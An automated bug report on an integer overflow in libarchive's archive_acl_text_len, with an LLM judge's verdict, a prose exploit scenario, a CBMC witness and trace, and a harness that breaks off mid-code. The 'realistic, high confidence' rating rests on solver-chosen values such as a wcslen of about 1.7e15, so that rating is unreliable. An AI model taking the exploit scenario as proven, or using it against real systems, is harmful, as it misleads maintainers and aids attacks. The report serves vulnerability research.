# Bug report: `archive_acl_text_len` — archive_acl_text_len.overflow.3

**Evidence grade**: **A** — dynamically confirmed (same property class)

## Target

- **Project**: libarchive (snapshot `67830f7b9c27080c0170bcd71d94fb42316c47dd`)
- **Source file**: `libarchive/archive_acl.c`
- **Function**: `archive_acl_text_len`
- **Violated property**: `archive_acl_text_len.overflow.3` (CBMC)

## Layered verdicts

| Layer | Result |
|---|---|
| CBMC | counterexample found at `archive_acl_text_len.overflow.3` |
| LLM judge (primary) | **realistic** / confidence `high` |
| Dynamic reproduction (ASan/UBSan + real libarchive .so) | `confirmed_dynamic` (signal `SIGABRT`) |

## Judge reasoning

The unsigned integer overflow in archive_acl_text_len at the line "length += 6" is a realistic exploitable bug. The function accumulates the length of ACL text representation by iterating through ACL entries and adding lengths of user/group names obtained via wcslen(). If an ACL entry contains an extremely long name (or a name string without proper null termination), wcslen() can return a very large value causing length to overflow. The witness shows length reaching UINT64_MAX-2 before adding 6, which overflows to 3. Both callers (archive_acl_to_text_l and archive_acl_to_text_w) use the returned length to allocate a buffer via malloc(length * sizeof(*p)). An overflowed small length value causes a tiny buffer allocation, but the subsequent writing loop will write the actual (much larger) amount of data, causing a heap buffer overflow. An attacker can trigger this by crafting an archive with ACL entries containing extremely long user/group names.

## Exploit scenario (LLM-supplied)

An attacker creates a malicious archive file (tar, cpio, etc.) with ACL metadata containing entries with extremely long user or group names (or multiple entries whose combined name lengths exceed SIZE_MAX). When libarchive parses this archive and calls archive_acl_to_text_w() or archive_acl_to_text_l() to convert ACL data to text format, archive_acl_text_len() overflows during length calculation and returns a small value (e.g., 3). The caller allocates a tiny buffer but then writes gigabytes of ACL text data into it, causing a heap buffer overflow that can lead to code execution or denial of service.

### CBMC witness (variable assignments)

```text
  __CPROVER_dead_object = NULL
  __CPROVER_deallocated = NULL
  __CPROVER_errno = 0
  __CPROVER_malloc_is_new_array = False
  __CPROVER_max_malloc_size = 36028797018963968ul
  __CPROVER_memory_leak = {'name': 'unknown'}
  __CPROVER_rounding_mode = 0
  a = ((struct archive *)NULL)
  acl = dynamic_object
  ap = dynamic_object$7
  byte_extract_little_endian(dynamic_object$0.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$1.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$2.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$3.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$4.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$5.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$6.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$7.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$8.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  byte_extract_little_endian(dynamic_object$9.name, 0l, unsigned char [sizeof(struct archive_mstring) /*104ul*/ ]) = <array: 104 elements>
  c = 0
  count = 5
  dynamic_object = <struct: 10 members>
  dynamic_object$0 = <struct: 6 members>
  dynamic_object$0.id = 5
  dynamic_object$0.name = <struct: 6 members>
  dynamic_object$0.name.$pad5 = 0u
  dynamic_object$0.name.aes_mbs = <struct: 3 members>
  dynamic_object$0.name.aes_mbs.buffer_length = 0ul
  dynamic_object$0.name.aes_mbs.length = 0ul
  dynamic_object$0.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$0.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$0.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$0.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$0.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$0.name.aes_set = 0
  dynamic_object$0.name.aes_utf8 = <struct: 3 members>
  dynamic_object$0.name.aes_utf8.buffer_length = 0ul
  dynamic_object$0.name.aes_utf8.length = 0ul
  dynamic_object$0.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$0.name.aes_wcs = <struct: 3 members>
  dynamic_object$0.name.aes_wcs.buffer_length = 0ul
  dynamic_object$0.name.aes_wcs.length = 0ul
  dynamic_object$0.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$0.next = dynamic_object$1
  dynamic_object$0.permset = 0
  dynamic_object$0.tag = 10003
  dynamic_object$0.type = 512
  dynamic_object$1 = <struct: 6 members>
  dynamic_object$1.id = 996521275
  dynamic_object$1.name = <struct: 6 members>
  dynamic_object$1.name.$pad5 = 0u
  dynamic_object$1.name.aes_mbs = <struct: 3 members>
  dynamic_object$1.name.aes_mbs.buffer_length = 0ul
  dynamic_object$1.name.aes_mbs.length = 0ul
  dynamic_object$1.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$1.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$1.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$1.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$1.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$1.name.aes_set = 0
  dynamic_object$1.name.aes_utf8 = <struct: 3 members>
  dynamic_object$1.name.aes_utf8.buffer_length = 0ul
  dynamic_object$1.name.aes_utf8.length = 0ul
  dynamic_object$1.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$1.name.aes_wcs = <struct: 3 members>
  dynamic_object$1.name.aes_wcs.buffer_length = 0ul
  dynamic_object$1.name.aes_wcs.length = 0ul
  dynamic_object$1.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$1.next = dynamic_object$2
  dynamic_object$1.permset = 0
  dynamic_object$1.tag = 10003
  dynamic_object$1.type = 4096
  dynamic_object$2 = <struct: 6 members>
  dynamic_object$2.id = 83750369
  dynamic_object$2.name = <struct: 6 members>
  dynamic_object$2.name.$pad5 = 0u
  dynamic_object$2.name.aes_mbs = <struct: 3 members>
  dynamic_object$2.name.aes_mbs.buffer_length = 0ul
  dynamic_object$2.name.aes_mbs.length = 0ul
  dynamic_object$2.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$2.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$2.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$2.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$2.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$2.name.aes_set = 0
  dynamic_object$2.name.aes_utf8 = <struct: 3 members>
  dynamic_object$2.name.aes_utf8.buffer_length = 0ul
  dynamic_object$2.name.aes_utf8.length = 0ul
  dynamic_object$2.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$2.name.aes_wcs = <struct: 3 members>
  dynamic_object$2.name.aes_wcs.buffer_length = 0ul
  dynamic_object$2.name.aes_wcs.length = 0ul
  dynamic_object$2.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$2.next = dynamic_object$3
  dynamic_object$2.permset = 0
  dynamic_object$2.tag = 10006
  dynamic_object$2.type = 8192
  dynamic_object$3 = <struct: 6 members>
  dynamic_object$3.id = 2097155913
  dynamic_object$3.name = <struct: 6 members>
  dynamic_object$3.name.$pad5 = 0u
  dynamic_object$3.name.aes_mbs = <struct: 3 members>
  dynamic_object$3.name.aes_mbs.buffer_length = 0ul
  dynamic_object$3.name.aes_mbs.length = 0ul
  dynamic_object$3.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$3.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$3.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$3.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$3.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$3.name.aes_set = 0
  dynamic_object$3.name.aes_utf8 = <struct: 3 members>
  dynamic_object$3.name.aes_utf8.buffer_length = 0ul
  dynamic_object$3.name.aes_utf8.length = 0ul
  dynamic_object$3.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$3.name.aes_wcs = <struct: 3 members>
  dynamic_object$3.name.aes_wcs.buffer_length = 0ul
  dynamic_object$3.name.aes_wcs.length = 0ul
  dynamic_object$3.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$3.next = dynamic_object$4
  dynamic_object$3.permset = 0
  dynamic_object$3.tag = 10001
  dynamic_object$3.type = 1024
  dynamic_object$4 = <struct: 6 members>
  dynamic_object$4.id = 1212417781
  dynamic_object$4.name = <struct: 6 members>
  dynamic_object$4.name.$pad5 = 0u
  dynamic_object$4.name.aes_mbs = <struct: 3 members>
  dynamic_object$4.name.aes_mbs.buffer_length = 0ul
  dynamic_object$4.name.aes_mbs.length = 0ul
  dynamic_object$4.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$4.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$4.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$4.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$4.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$4.name.aes_set = 0
  dynamic_object$4.name.aes_utf8 = <struct: 3 members>
  dynamic_object$4.name.aes_utf8.buffer_length = 0ul
  dynamic_object$4.name.aes_utf8.length = 0ul
  dynamic_object$4.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$4.name.aes_wcs = <struct: 3 members>
  dynamic_object$4.name.aes_wcs.buffer_length = 0ul
  dynamic_object$4.name.aes_wcs.length = 0ul
  dynamic_object$4.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$4.next = dynamic_object$5
  dynamic_object$4.permset = 0
  dynamic_object$4.tag = 10003
  dynamic_object$4.type = 4096
  dynamic_object$5 = <struct: 6 members>
  dynamic_object$5.id = 838860880
  dynamic_object$5.name = <struct: 6 members>
  dynamic_object$5.name.$pad5 = 0u
  dynamic_object$5.name.aes_mbs = <struct: 3 members>
  dynamic_object$5.name.aes_mbs.buffer_length = 0ul
  dynamic_object$5.name.aes_mbs.length = 0ul
  dynamic_object$5.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$5.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$5.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$5.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$5.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$5.name.aes_set = 0
  dynamic_object$5.name.aes_utf8 = <struct: 3 members>
  dynamic_object$5.name.aes_utf8.buffer_length = 0ul
  dynamic_object$5.name.aes_utf8.length = 0ul
  dynamic_object$5.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$5.name.aes_wcs = <struct: 3 members>
  dynamic_object$5.name.aes_wcs.buffer_length = 0ul
  dynamic_object$5.name.aes_wcs.length = 0ul
  dynamic_object$5.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$5.next = dynamic_object$6
  dynamic_object$5.permset = 0
  dynamic_object$5.tag = 10002
  dynamic_object$5.type = 256
  dynamic_object$6 = <struct: 6 members>
  dynamic_object$6.id = 2107913991
  dynamic_object$6.name = <struct: 6 members>
  dynamic_object$6.name.$pad5 = 0u
  dynamic_object$6.name.aes_mbs = <struct: 3 members>
  dynamic_object$6.name.aes_mbs.buffer_length = 0ul
  dynamic_object$6.name.aes_mbs.length = 0ul
  dynamic_object$6.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$6.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$6.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$6.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$6.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$6.name.aes_set = 0
  dynamic_object$6.name.aes_utf8 = <struct: 3 members>
  dynamic_object$6.name.aes_utf8.buffer_length = 0ul
  dynamic_object$6.name.aes_utf8.length = 0ul
  dynamic_object$6.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$6.name.aes_wcs = <struct: 3 members>
  dynamic_object$6.name.aes_wcs.buffer_length = 0ul
  dynamic_object$6.name.aes_wcs.length = 0ul
  dynamic_object$6.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$6.next = dynamic_object$7
  dynamic_object$6.permset = 0
  dynamic_object$6.tag = 10003
  dynamic_object$6.type = 512
  dynamic_object$7 = <struct: 6 members>
  dynamic_object$7.id = 61
  dynamic_object$7.name = <struct: 6 members>
  dynamic_object$7.name.$pad5 = 0u
  dynamic_object$7.name.aes_mbs = <struct: 3 members>
  dynamic_object$7.name.aes_mbs.buffer_length = 0ul
  dynamic_object$7.name.aes_mbs.length = 0ul
  dynamic_object$7.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$7.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$7.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$7.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$7.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$7.name.aes_set = 0
  dynamic_object$7.name.aes_utf8 = <struct: 3 members>
  dynamic_object$7.name.aes_utf8.buffer_length = 0ul
  dynamic_object$7.name.aes_utf8.length = 0ul
  dynamic_object$7.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$7.name.aes_wcs = <struct: 3 members>
  dynamic_object$7.name.aes_wcs.buffer_length = 0ul
  dynamic_object$7.name.aes_wcs.length = 0ul
  dynamic_object$7.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$7.next = dynamic_object$8
  dynamic_object$7.permset = 0
  dynamic_object$7.tag = 10002
  dynamic_object$7.type = 2048
  dynamic_object$8 = <struct: 6 members>
  dynamic_object$8.id = 1081729745
  dynamic_object$8.name = <struct: 6 members>
  dynamic_object$8.name.$pad5 = 0u
  dynamic_object$8.name.aes_mbs = <struct: 3 members>
  dynamic_object$8.name.aes_mbs.buffer_length = 0ul
  dynamic_object$8.name.aes_mbs.length = 0ul
  dynamic_object$8.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$8.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$8.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$8.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$8.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$8.name.aes_set = 0
  dynamic_object$8.name.aes_utf8 = <struct: 3 members>
  dynamic_object$8.name.aes_utf8.buffer_length = 0ul
  dynamic_object$8.name.aes_utf8.length = 0ul
  dynamic_object$8.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$8.name.aes_wcs = <struct: 3 members>
  dynamic_object$8.name.aes_wcs.buffer_length = 0ul
  dynamic_object$8.name.aes_wcs.length = 0ul
  dynamic_object$8.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$8.next = dynamic_object$9
  dynamic_object$8.permset = 0
  dynamic_object$8.tag = 10003
  dynamic_object$8.type = 2048
  dynamic_object$9 = <struct: 6 members>
  dynamic_object$9.id = 1271184389
  dynamic_object$9.name = <struct: 6 members>
  dynamic_object$9.name.$pad5 = 0u
  dynamic_object$9.name.aes_mbs = <struct: 3 members>
  dynamic_object$9.name.aes_mbs.buffer_length = 0ul
  dynamic_object$9.name.aes_mbs.length = 0ul
  dynamic_object$9.name.aes_mbs.s = ((const char *)NULL)
  dynamic_object$9.name.aes_mbs_in_locale = <struct: 3 members>
  dynamic_object$9.name.aes_mbs_in_locale.buffer_length = 0ul
  dynamic_object$9.name.aes_mbs_in_locale.length = 0ul
  dynamic_object$9.name.aes_mbs_in_locale.s = ((const char *)NULL)
  dynamic_object$9.name.aes_set = 0
  dynamic_object$9.name.aes_utf8 = <struct: 3 members>
  dynamic_object$9.name.aes_utf8.buffer_length = 0ul
  dynamic_object$9.name.aes_utf8.length = 0ul
  dynamic_object$9.name.aes_utf8.s = ((const char *)NULL)
  dynamic_object$9.name.aes_wcs = <struct: 3 members>
  dynamic_object$9.name.aes_wcs.buffer_length = 0ul
  dynamic_object$9.name.aes_wcs.length = 0ul
  dynamic_object$9.name.aes_wcs.s = ((signed int *)NULL)
  dynamic_object$9.next = ((struct archive_acl_entry *)NULL)
  dynamic_object$9.permset = 0
  dynamic_object$9.tag = 10004
  dynamic_object$9.type = 512
  dynamic_object.$pad1 = 0u
  dynamic_object.$pad5 = 0u
  dynamic_object.$pad9 = 0u
  dynamic_object.acl_head = dynamic_object$0
  dynamic_object.acl_p = ((struct archive_acl_entry *)NULL)
  dynamic_object.acl_state = 0
  dynamic_object.acl_text = ((const char *)NULL)
  dynamic_object.acl_text_w = ((signed int *)NULL)
  dynamic_object.acl_types = 0
  dynamic_object.mode = 0u
  entry = dynamic_object$9
  flags = 0x4
  goto_symex$$return_value$$malloc = {'name': 'unknown'}
  i = 10u
  idlen = 0
  len = 16356510908467378153ul
  length = 18446744073709551613ul
  malloc_res = {'name': 'unknown'}
  malloc_size = sizeof(struct archive_acl_entry) /*128ul*/ 
  malloc_value = {'name': 'unknown'}
  n = sizeof(struct archive_mstring) /*104ul*/ 
  name = {'name': 'unknown'}
  nfsv4_acl_flag_map = <array: 7 elements>
  nfsv4_acl_flag_map[0l] = <struct: 4 members>
  nfsv4_acl_flag_map[0l].$pad2 = 0
  nfsv4_acl_flag_map[0l].c = 'f'
  nfsv4_acl_flag_map[0l].perm = 33554432
  nfsv4_acl_flag_map[0l].wc = 102
  nfsv4_acl_flag_map[1l] = <struct: 4 members>
  nfsv4_acl_flag_map[1l].$pad2 = 0
  nfsv4_acl_flag_map[1l].c = 'd'
  nfsv4_acl_flag_map[1l].perm = 67108864
  nfsv4_acl_flag_map[1l].wc = 100
  nfsv4_acl_flag_map[2l] = <struct: 4 members>
  nfsv4_acl_flag_map[2l].$pad2 = 0
  nfsv4_acl_flag_map[2l].c = 'i'
  nfsv4_acl_flag_map[2l].perm = 268435456
  nfsv4_acl_flag_map[2l].wc = 105
  nfsv4_acl_flag_map[3l] = <struct: 4 members>
  nfsv4_acl_flag_map[3l].$pad2 = 0
  nfsv4_acl_flag_map[3l].c = 'n'
  nfsv4_acl_flag_map[3l].perm = 134217728
  nfsv4_acl_flag_map[3l].wc = 110
  nfsv4_acl_flag_map[4l] = <struct: 4 members>
  nfsv4_acl_flag_map[4l].$pad2 = 0
  nfsv4_acl_flag_map[4l].c = 'S'
  nfsv4_acl_flag_map[4l].perm = 536870912
  nfsv4_acl_flag_map[4l].wc = 83
  nfsv4_acl_flag_map[5l] = <struct: 4 members>
  nfsv4_acl_flag_map[5l].$pad2 = 0
  nfsv4_acl_flag_map[5l].c = 'F'
  nfsv4_acl_flag_map[5l].perm = 1073741824
  nfsv4_acl_flag_map[5l].wc = 70
  nfsv4_acl_flag_map[6l] = <struct: 4 members>
  nfsv4_acl_flag_map[6l].$pad2 = 0
  nfsv4_acl_flag_map[6l].c = 'I'
  nfsv4_acl_flag_map[6l].perm = 16777216
  nfsv4_acl_flag_map[6l].wc = 73
  nfsv4_acl_flag_map_size = 7
  nfsv4_acl_perm_map = <array: 14 elements>
  nfsv4_acl_perm_map[0l] = <struct: 4 members>
  nfsv4_acl_perm_map[0l].$pad2 = 0
  nfsv4_acl_perm_map[0l].c = 'r'
  nfsv4_acl_perm_map[0l].perm = 8
  nfsv4_acl_perm_map[0l].wc = 114
  nfsv4_acl_perm_map[10l] = <struct: 4 members>
  nfsv4_acl_perm_map[10l].$pad2 = 0
  nfsv4_acl_perm_map[10l].c = 'c'
  nfsv4_acl_perm_map[10l].perm = 4096
  nfsv4_acl_perm_map[10l].wc = 99
  nfsv4_acl_perm_map[11l] = <struct: 4 members>
  nfsv4_acl_perm_map[11l].$pad2 = 0
  nfsv4_acl_perm_map[11l].c = 'C'
  nfsv4_acl_perm_map[11l].perm = 8192
  nfsv4_acl_perm_map[11l].wc = 67
  nfsv4_acl_perm_map[12l] = <struct: 4 members>
  nfsv4_acl_perm_map[12l].$pad2 = 0
  nfsv4_acl_perm_map[12l].c = 'o'
  nfsv4_acl_perm_map[12l].perm = 16384
  nfsv4_acl_perm_map[12l].wc = 111
  nfsv4_acl_perm_map[13l] = <struct: 4 members>
  nfsv4_acl_perm_map[13l].$pad2 = 0
  nfsv4_acl_perm_map[13l].c = 's'
  nfsv4_acl_perm_map[13l].perm = 32768
  nfsv4_acl_perm_map[13l].wc = 115
  nfsv4_acl_perm_map[1l] = <struct: 4 members>
  nfsv4_acl_perm_map[1l].$pad2 = 0
  nfsv4_acl_perm_map[1l].c = 'w'
  nfsv4_acl_perm_map[1l].perm = 16
  nfsv4_acl_perm_map[1l].wc = 119
  nfsv4_acl_perm_map[2l] = <struct: 4 members>
  nfsv4_acl_perm_map[2l].$pad2 = 0
  nfsv4_acl_perm_map[2l].c = 'x'
  nfsv4_acl_perm_map[2l].perm = 1
  nfsv4_acl_perm_map[2l].wc = 120
  nfsv4_acl_perm_map[3l] = <struct: 4 members>
  nfsv4_acl_perm_map[3l].$pad2 = 0
  nfsv4_acl_perm_map[3l].c = 'p'
  nfsv4_acl_perm_map[3l].perm = 32
  nfsv4_acl_perm_map[3l].wc = 112
  nfsv4_acl_perm_map[4l] = <struct: 4 members>
  nfsv4_acl_perm_map[4l].$pad2 = 0
  nfsv4_acl_perm_map[4l].c = 'd'
  nfsv4_acl_perm_map[4l].perm = 2048
  nfsv4_acl_perm_map[4l].wc = 100
  nfsv4_acl_perm_map[5l] = <struct: 4 members>
  nfsv4_acl_perm_map[5l].$pad2 = 0
  nfsv4_acl_perm_map[5l].c = 'D'
  nfsv4_acl_perm_map[5l].perm = 256
  nfsv4_acl_perm_map[5l].wc = 68
  nfsv4_acl_perm_map[6l] = <struct: 4 members>
  nfsv4_acl_perm_map[6l].$pad2 = 0
  nfsv4_acl_perm_map[6l].c = 'a'
  nfsv4_acl_perm_map[6l].perm = 512
  nfsv4_acl_perm_map[6l].wc = 97
  nfsv4_acl_perm_map[7l] = <struct: 4 members>
  nfsv4_acl_perm_map[7l].$pad2 = 0
  nfsv4_acl_perm_map[7l].c = 'A'
  nfsv4_acl_perm_map[7l].perm = 1024
  nfsv4_acl_perm_map[7l].wc = 65
  nfsv4_acl_perm_map[8l] = <struct: 4 members>
  nfsv4_acl_perm_map[8l].$pad2 = 0
  nfsv4_acl_perm_map[8l].c = 'R'
  nfsv4_acl_perm_map[8l].perm = 64
  nfsv4_acl_perm_map[8l].wc = 82
  nfsv4_acl_perm_map[9l] = <struct: 4 members>
  nfsv4_acl_perm_map[9l].$pad2 = 0
  nfsv4_acl_perm_map[9l].c = 'W'
  nfsv4_acl_perm_map[9l].perm = 128
  nfsv4_acl_perm_map[9l].wc = 87
  nfsv4_acl_perm_map_size = 14
  num_entries = 10u
  prev = dynamic_object$9
  r = 0
  record_malloc = False
  record_may_leak = False
  result = 0ul
  return_value___VERIFIER_nondet___CPROVER_bool$1 = False
  return_value___VERIFIER_nondet___CPROVER_bool$2 = False
  return_value_archive_acl_text_len = 0ul
  return_value_malloc = {'name': 'unknown'}
  return_value_malloc$0 = {'name': 'unknown'}
  return_value_nondet_int = 0
  return_value_nondet_int$0 = 0
  return_value_nondet_int$1 = 10004
  return_value_nondet_int$2 = 512
  return_value_nondet_int$3 = 0
  return_value_nondet_int$4 = 1271184389
  return_value_nondet_int$5 = 15360
  return_value_nondet_int$6 = 0x4
  return_value_nondet_int$7 = 1
  return_value_nondet_uint = 0
  return_value_wcslen = 1691048883535802ul
  s = {'name': 'unknown'}
  s_n = <array: 104 elements>
  s_n$array_size = sizeof(struct archive_mstring) /*104ul*/ 
  sc = ((struct archive_string_conv *)NULL)
  tag = 10004
  tmp = 0
  type = 512
  want_type = 15360
  wcslen_ret = 0ul
  wide = 1
  wname = {'name': 'unknown'}
```

### CBMC trace (first 80 steps)

```text
  1. function-call at ?:?
  2. __CPROVER_dead_object = NULL
  3. __CPROVER_deallocated = NULL
  4. __CPROVER_errno = 0
  5. __CPROVER_malloc_is_new_array = False
  6. __CPROVER_max_malloc_size = 36028797018963968ul
  7. __CPROVER_memory_leak = NULL
  8. __CPROVER_rounding_mode = 0
  9. nfsv4_acl_flag_map = <array: 7 elements>
 10. nfsv4_acl_flag_map[0l] = <struct: 4 members>
 11. nfsv4_acl_flag_map[0l].perm = 33554432
 12. nfsv4_acl_flag_map[0l].c = 'f'
 13. nfsv4_acl_flag_map[0l].$pad2 = 0
 14. nfsv4_acl_flag_map[0l].wc = 102
 15. nfsv4_acl_flag_map[1l] = <struct: 4 members>
 16. nfsv4_acl_flag_map[1l].perm = 67108864
 17. nfsv4_acl_flag_map[1l].c = 'd'
 18. nfsv4_acl_flag_map[1l].$pad2 = 0
 19. nfsv4_acl_flag_map[1l].wc = 100
 20. nfsv4_acl_flag_map[2l] = <struct: 4 members>
 21. nfsv4_acl_flag_map[2l].perm = 268435456
 22. nfsv4_acl_flag_map[2l].c = 'i'
 23. nfsv4_acl_flag_map[2l].$pad2 = 0
 24. nfsv4_acl_flag_map[2l].wc = 105
 25. nfsv4_acl_flag_map[3l] = <struct: 4 members>
 26. nfsv4_acl_flag_map[3l].perm = 134217728
 27. nfsv4_acl_flag_map[3l].c = 'n'
 28. nfsv4_acl_flag_map[3l].$pad2 = 0
 29. nfsv4_acl_flag_map[3l].wc = 110
 30. nfsv4_acl_flag_map[4l] = <struct: 4 members>
 31. nfsv4_acl_flag_map[4l].perm = 536870912
 32. nfsv4_acl_flag_map[4l].c = 'S'
 33. nfsv4_acl_flag_map[4l].$pad2 = 0
 34. nfsv4_acl_flag_map[4l].wc = 83
 35. nfsv4_acl_flag_map[5l] = <struct: 4 members>
 36. nfsv4_acl_flag_map[5l].perm = 1073741824
 37. nfsv4_acl_flag_map[5l].c = 'F'
 38. nfsv4_acl_flag_map[5l].$pad2 = 0
 39. nfsv4_acl_flag_map[5l].wc = 70
 40. nfsv4_acl_flag_map[6l] = <struct: 4 members>
 41. nfsv4_acl_flag_map[6l].perm = 16777216
 42. nfsv4_acl_flag_map[6l].c = 'I'
 43. nfsv4_acl_flag_map[6l].$pad2 = 0
 44. nfsv4_acl_flag_map[6l].wc = 73
 45. nfsv4_acl_flag_map_size = 7
 46. nfsv4_acl_perm_map = <array: 14 elements>
 47. nfsv4_acl_perm_map[0l] = <struct: 4 members>
 48. nfsv4_acl_perm_map[0l].perm = 8
 49. nfsv4_acl_perm_map[0l].c = 'r'
 50. nfsv4_acl_perm_map[0l].$pad2 = 0
 51. nfsv4_acl_perm_map[0l].wc = 114
 52. nfsv4_acl_perm_map[1l] = <struct: 4 members>
 53. nfsv4_acl_perm_map[1l].perm = 16
 54. nfsv4_acl_perm_map[1l].c = 'w'
 55. nfsv4_acl_perm_map[1l].$pad2 = 0
 56. nfsv4_acl_perm_map[1l].wc = 119
 57. nfsv4_acl_perm_map[2l] = <struct: 4 members>
 58. nfsv4_acl_perm_map[2l].perm = 1
 59. nfsv4_acl_perm_map[2l].c = 'x'
 60. nfsv4_acl_perm_map[2l].$pad2 = 0
 61. nfsv4_acl_perm_map[2l].wc = 120
 62. nfsv4_acl_perm_map[3l] = <struct: 4 members>
 63. nfsv4_acl_perm_map[3l].perm = 32
 64. nfsv4_acl_perm_map[3l].c = 'p'
 65. nfsv4_acl_perm_map[3l].$pad2 = 0
 66. nfsv4_acl_perm_map[3l].wc = 112
 67. nfsv4_acl_perm_map[4l] = <struct: 4 members>
 68. nfsv4_acl_perm_map[4l].perm = 2048
 69. nfsv4_acl_perm_map[4l].c = 'd'
 70. nfsv4_acl_perm_map[4l].$pad2 = 0
 71. nfsv4_acl_perm_map[4l].wc = 100
 72. nfsv4_acl_perm_map[5l] = <struct: 4 members>
 73. nfsv4_acl_perm_map[5l].perm = 256
 74. nfsv4_acl_perm_map[5l].c = 'D'
 75. nfsv4_acl_perm_map[5l].$pad2 = 0
 76. nfsv4_acl_perm_map[5l].wc = 68
 77. nfsv4_acl_perm_map[6l] = <struct: 4 members>
 78. nfsv4_acl_perm_map[6l].perm = 512
 79. nfsv4_acl_perm_map[6l].c = 'a'
 80. nfsv4_acl_perm_map[6l].$pad2 = 0
```

### CBMC harness (bundled at `findings/v7/harnesses/archive_acl__archive_acl_text_len__archive_acl_text_len.overflow.3.c`)

```c
/* CBMC harness for: archive_acl_text_len */
#include "/tmp/libarchive_seedhunt_full/archive_acl.c"

int main(void) {
    /* Allocate the archive_acl structure */
    struct archive_acl *acl = malloc(sizeof(struct archive_acl));
    __CPROVER_assume(acl != NULL);
    
    /* Initialize mode field */
    acl->mode = nondet_uint();
    acl->acl_state = nondet_int();
    acl->acl_text_w = NULL;
    acl->acl_text = NULL;
    acl->acl_types = nondet_int();
    acl->acl_p = NULL;
    
    /* Create a bounded linked list of ACL entries */
    unsigned int num_entries;
    __CPROVER_assume(num_entries <= 10);
    
    struct archive_acl_entry *prev = NULL;
    acl->acl_head = NULL;
    
    for (unsigned int i = 0; i < num_entries; i++) {
        struct archive_acl_entry *entry = malloc(sizeof(struct archive_acl_entry));
        __CPROVER_assume(entry != NULL);
        
        /* Set entry fields based on real caller constraints */
        /* tag must be one of the valid ACL tag values */
        int tag = nondet_int();
        __CPROVER_assume(tag == 10001 || tag == 10002 || tag == 10003 || 
                        tag == 10004 || tag == 10005 || tag == 10006 || 
                        tag == 10107);
        entry->tag = tag;
        
        /* type must be one of the valid ACL type values */
        int type = nondet_int();
